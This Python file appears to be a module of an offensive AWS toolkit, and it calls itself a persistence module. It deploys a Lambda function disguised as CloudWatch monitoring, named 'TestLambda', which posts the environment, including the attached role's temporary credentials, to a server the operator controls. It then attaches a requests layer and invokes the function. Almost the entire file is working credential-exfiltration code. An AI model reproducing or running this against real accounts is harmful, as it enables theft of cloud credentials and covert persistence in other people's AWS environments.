import boto3
import botocore
import os
import time
import zipfile
from colorama import Fore, Style
from functions import create_client

def help():
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")
    print("[+] Module Description:\n")
    print("\tThis module will create a lambda that will export temporary credentials")
    print("\tfor the role attached to it to a server of your choosing.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will ask you for an address of a server you control, the arn of a role to be")
    print("\tpassed to the new lambda function and the region to create the lambda.")

    print("[+] IMPORTANT:\n")
    print("\tYou need the 'iam:passrole' and 'lambda:create_function' permissions.")
    print("\tThis lambda will have to be triggered manually.")
    print(f"{Fore.YELLOW}\n================================================================================================{Style.RESET_ALL}")

def aws_file():
    with open("lambda_function.zip", 'rb') as file_data:
        bytes_content = file_data.read()

    return bytes_content

def create_lambda(client, function_role):
    response = client.create_function(
        FunctionName="TestLambda",
        Runtime="python3.9",
        Role=function_role,
        Handler="lambda_function.lambda_handler",
        Code={
            "ZipFile": aws_file()
        },
        Description="Lambda de monitoramento de Eventos do CloudWatch.",
        Publish=True,
        PackageType="Zip"
       )

    return response

def create_lambda_file(server_address, lambda_path):
    lambda_code = f"""
import json
import os
import requests

def lambda_handler(event, context):
    environment = os.environ.copy()
    requests.post('http://{server_address}/', json=environment, timeout=0.01)
    return '200 OK'
"""

    try:
        print('[+] Zipping Lambda function...\n')
        with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('lambda_function.py', lambda_code)
    except Exception as e:
        print('Failed to zip Lambda: {}\n'.format(e))

def create_lambda_layer(client):
    with open("./data/requests.zip", 'rb') as file_data:
        bytes_content = file_data.read()
    response = client.publish_layer_version(
            LayerName='layer_requests',
        Description='Used to perform standard HTTP requests.',
        Content={'ZipFile': bytes_content},
        CompatibleRuntimes=['python3.9']
    )

    return response 

def check_lambda_status(client, function_name):
    response = client.get_function(
        FunctionName=function_name
    )

    if response['Configuration']['State'] == 'Active':
        return True
    else:
        return False

def invoke_lambda(client, function_name):
    response = client.invoke(
        FunctionName=function_name,
    )

    return response

def update_layer_information(client, function_name):
    response = client.update_function_configuration(
        FunctionName=function_name,
        Layers=[
            'arn:aws:lambda:sa-east-1:601904299386:layer:layer_requests:1'
        ]
    )

    return response

def main(botoconfig, session):
    results = {}

    print("[+] Starting persistence module...")
    function_role = input("[+] Please input the " + Fore.YELLOW + "role arn" + Style.RESET_ALL + " to be passed to the Lambda function: ")
    region_name = input("[+] Please input the " + Fore.YELLOW + "region" + Style.RESET_ALL + " to be used: ")
    server_address = input("[+] Please input the " + Fore.YELLOW + "server address" + Style.RESET_ALL + " to be used: ")
    lambda_path = './lambda_function.zip'

    print("[+] Creating Lambda file...")
    create_lambda_file(server_address, lambda_path)

    print("[+] Creating Lambda Function...")
    lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
    function_data = create_lambda(lambda_client.create_aws_client(), function_role)
    print(f"[+] Lambda created: {Fore.GREEN}{function_data['FunctionName']}{Style.RESET_ALL}")
    results['FunctionName'] = function_data['FunctionName']
    results['FunctionArn'] = function_data['FunctionArn']
    
    print("[+] Creating Lambda Layer...")
    layer_client = boto3.client("lambda", config=botoconfig, region_name=region_name)
    layer_information = create_lambda_layer(layer_client)
    if layer_information['ResponseMetadata']['HTTPStatusCode'] == 201:
        print(f"{Fore.GREEN}[+] Layer created!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to create layer, attack failed...{Style.RESET_ALL}")

    print("[+] Checking for lambda status...")
    while True:
        token = check_lambda_status(layer_client, function_data['FunctionName'])
        if token:
            break
        else:
            time.sleep(10)

    print("[+] Assingning Layer to Function...")
    update_layer = update_layer_information(layer_client, function_data['FunctionName'])
    if update_layer['ResponseMetadata']['HTTPStatusCode'] == 200:
        print(f"{Fore.GREEN}[+] Layer assigned! Attack Complete!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Failed to assign layer, attack failed...{Style.RESET_ALL}")

    os.remove(lambda_path)

    print("[+] Invoking Function...")
    lambda_invoke = invoke_lambda(lambda_client)
    print(lambda_invoke)

    return results